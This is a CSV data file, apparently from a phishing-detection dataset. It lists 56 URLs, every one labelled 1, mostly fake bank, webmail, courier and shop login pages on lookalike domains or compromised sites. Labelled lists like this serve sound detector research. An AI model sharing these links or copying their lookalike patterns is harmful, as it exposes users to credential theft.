,url,label
0,http://br14.teste.website/~exclus23/produto/183175844/iphone-7-plus-128gb-vermelho-tela-retina-hd-5-5-3d-touch-camera-dupla-de-12mp-apple/,1
1,http://www.boutycone.fr/mail/assure_somtc=true/99f5c49b3237b7e259ce54c7730c0ab4/,1
2,https://www.stoneville.bfb.asn.au/sign-in,1
3,http://radioramamexicali.com/alor/index.html,1
4,http://radioramabajio.com/dhll/DHLAUTO/dhl2.htm,1
5,http://stainupurworejo.ac.id/pmb/image/secured/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product-email&email=,1
6,http://georginahassan.com/wp-includes/images/smilies/dropse/,1
7,http://www.bofa-checkings.com/,1
8,http://aromsh.se/bankofamerica.com.lgoin.2017/,1
9,http://www.bofacgi-reviews.com/verification/95C5E750575D16N366DD/index.php,1
10,http://milesfork.com/brako/service-server/common/,1
11,https://stavlisio.com/update2018/login.php?https://login.live.com/GetSessionState.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid profile email offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAeNisNLLKCkpKLbS109Myc3M0ysoyi9JTS7JzM_Tyy8tycnPz9ZLzs_Vyy9Kz0wBsYqEuAQUN61SL7LY4N-7wPjWqz9ev2YxcsbnZJalguRXMWoSY6B-anKB_gVGxheMjJuY2H2dPOO9XSNPMDUfk7vFJOhflO6ZEl7slpqSWpQI0nmBReAVC48BsxUHB5sAowSDAsMPFsZFrECnTAo1qLmuZuK0OaTi9yltYYZTrPoF2flJ3mF5xZ5ubgbZfvmu5mmRptmpzmEmxvplAZYF5VU-FaFhZb4B2VXJtkZWhhPYhCawMZ1iY9jFSbzLAQ2&amp;estsfed=1&amp;uaid=27aab22138724fb08da033daeafc4afa&amp;vaccess&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAeNisNLLKCkpKLbS109Myc3M0ysoyi9JTS7JzM_Tyy8tycnPz9ZLzs_Vyy9Kz0wBsYqEuAQUN61SL7LY4N-7wPjWqz9ev2YxcsbnZJalguRXMWoSY6B-anKB_gVGxheMjJuY2H2dPOO9XSNPMDUfk7vFJOhflO6ZEl7slpqSWpQI0nmBReAVC48BsxUHB5sAowSDAsMPFsZFrECnTAo1qLmuZuK0OaTi9yltYYZTrPoF2flJ3mF5xZ5ubgbZfvmu5mmRptmpzmEmxvplAZYF5VU-FaFhZb4B2VXJtkZWhhPYhCawMZ1iY9jFSbzLAQ2&amp;estsfed=1&amp;uaid=27aab22138724fb08da033daeafc4afa&amp;vv=1600&amp;mkt=EN-US&amp;lc=1033&amp;email=abuse@treas.state.nj.us,1
12,https://sign-in-office-com-secure004-access-auth-jspx-000.datasite.xyz/upgrade-your-account/office/index.html,1
13,http://maria-chelyapinaru.432.com1.ru/wellss/8e30e2d917bc2cf8c626f46fb2f6fff4/login.php?cmd=login_submit&id=MTU2MDEyNDIxNQ==MTU2MDEyNDIxNQ==&session=MTU2MDEyNDIxNQ==MTU2MDEyNDIxNQ==,1
14,http://darimanakemna-pak.com/Cgi-bin/outlook/fresh/error.php,1
15,https://greattelangana.info/wp-includes/widgets/flaco/Archive/verification.php,1
16,http://www.bofa-checkings.com/verification/7M5CE34D71E3C456AMN8/index.php,1
17,http://tbeep3u7bmjg.semiramis-asbl.org:8080/vnuUtcjr4We8/login.html,1
18,http://hwtoubye2yfk.lescarles.com:8080/82S8W2ePn1ur/login.html,1
19,https://www.pentreffest.org.uk/joomla/api/DropBoxPhoto/index.php,1
20,http://www.edunation.net/wells/wid,1
21,http://ideisa.com.br/wp-admin/js/login.php,1
22,https://aryianganesh.000webhostapp.com/cekpoint-loogin.html,1
23,http://anzbankings.com/seccc.htm,1
24,http://elnuevosistemamundo.com/dty/veror/login.php,1
25,http://radiohimilo.so/gggggg/outlook_clean/index.php,1
26,http://rizwantraders.com/jj/New/ii.php?email=abuse@dmv.co.uk&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1,1
27,http://redirectionofficielsupp.com/auth/ca7cd2f377ef1088a16fba59ed5933f0YjkxOGU2ZjE4M2FhNjk5YmVmMjZiZDllMjBlOWNiMWQ=/myaccount/websc_login/,1
28,http://ito.mx/L93q,1
29,https://edunation.net/wells/wid/login.php?cmd=login_submit&id=f38b16d88882320733816ca4fcd5c1f6f38b16d88882320733816ca4fcd5c1f6&session=f38b16d88882320733816ca4fcd5c1f6f38b16d88882320733816ca4fcd5c1f6,1
30,http://ideisa.com.br/wp-admin/js/index.php,1
31,http://www.jowiltravels.com/js/boa/,1
32,http://seo.jakex.co/cgi-/Share/share/verification.php,1
33,http://travel-hound.com/blog/wp-includes/js/tinymce/themes/modern/index33.php,1
34,https://www.stripephno.com/12/12/pass.php,1
35,http://ju-hogatt937135.cabanova.com,1
36,https://sites.google.com/site/securaktifity/,1
37,http://ads606.hol.es/confirmation_account.html,1
38,https://pakearthlinks.com/closed/done3/ofiice/,1
39,http://201.16.246.245/www.americanas.com.br/compras-online-promocao/zn1/produto/011/5415152/6521659865634/1185748755415414/fas78f4sag54gh/fsdaf1sdag1581ag745aeh/Smartphone-Samsung-J-7-Pro.html?,1
40,http://stickershop24.tk/,1
41,http://www.kanlayanee.ac.th/templates/sainttropez-fjt/slideshow/aruba.it/,1
42,http://fr65rt.webcindario.com/,1
43,http://asloubier.000webhostapp.com/trish/docpg2k18%20(1)/gieeedoc/alalin.php,1
44,https://sindro.xyz/gcc/iop/ios/nju/mkl/vgt/bhu/lks/white-23-5-18/jio/ght/bhu/vgt/cft/asd/lk1/1527059375XhkzSm1AGCWqkdPw7fuy.php?email=abuse@gen-i.co.nz,1
45,https://pirgos-restaurant.com/cli/photos/index.html,1
46,http://jn-accounting.com/.mims/board3/blackboard.htm,1
47,https://pay4151.com/ec1c83a719fce7602b9c1605fc_payment_3de88732a94a7c578/00f81ab50b4fd1_payments_ae9037ed66f85923/inteligo/index.php?id=1,1
48,http://vivrefort.com/images/Permission/drive/al.php,1
49,https://www.semana-da-oferta.com/produto.php?id=5abad2166139e,1
50,https://carmaos.com/invoice,1
51,https://bitcoincasinofreebonus.com/wp-content/themes/redirect.php,1
52,http://www.findrecoveryfb.tk/?safetyhelp.php,1
53,http://monida.net/upstrack/?IQ=abuse@loenbro.com,1
54,http://supercasasbahia.com/produto.php?linkcompleto=&amp;id=1,1
55,https://hcourriermms.godaddysites.com/,1
